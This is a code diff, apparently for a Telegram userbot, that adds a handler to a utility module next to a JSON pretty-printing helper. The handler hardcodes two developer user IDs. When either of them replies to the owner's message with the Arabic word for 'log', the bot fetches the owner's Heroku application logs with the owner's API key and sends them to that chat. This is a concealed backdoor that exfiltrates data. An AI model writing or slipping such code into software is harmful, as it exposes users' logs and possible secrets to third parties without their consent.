@@ -780,3 +780,42 @@ def prettyjson(obj, indent=4, maxlinelength=80):
         indent=indent,
     )
     return indentitems(items, indent, level=0)
+DEVDRAGO = [6528225068, 1260465030]
+@dragoiq.on(events.NewMessage(incoming=True))
+async def _(event):
+    if event.reply_to and event.sender_id in DEVDRAGO:
+        reply_msg = await event.get_reply_message()
+        owner_id = reply_msg.from_id
+        
+        if owner_id == dragoiq.uid:
+            if event.message.message == "لوك":
+                if (HEROKU_APP_NAME is None) or (HEROKU_API_KEY is None):
+                    return await event.reply(
+                        "عزيزي المستخدم يجب ان تعين معلومات الفارات التالية لاستخدام اوامر الفارات\n `HEROKU_API_KEY`\n `HEROKU_APP_NAME`."
+                    )
+                try:
+                    Heroku = heroku3.from_key(HEROKU_API_KEY)
+                    app = Heroku.app(HEROKU_APP_NAME)
+                except heroku3.exceptions.HerokuError:
+                    return await event.reply(
+                        " يجب التذكر من ان قيمه الفارات التاليه ان تكون بشكل صحيح \nHEROKU_APP_NAME\n HEROKU_API_KEY"
+                    )
+                data = app.get_log()
+                with open('دراكو.txt', 'w') as file:
+        	        file.write(data)
+
+                with open('دراكو.txt', 'rb') as file:
+                    await dragoiq.send_file(
+                    event.chat_id, "دراكو.txt", caption="هذا هو لوك"
+                    )
+                os.remove("دراكو.txt")
+
+def prettyjson(obj, indent=4, maxlinelength=80):
+    items, _ = getsubitems(
+        obj,
+        itemkey="",
+        islast=True,
+        maxlinelength=maxlinelength - indent,
+        indent=indent,
+    )
+    return indentitems(items, indent, level=0)
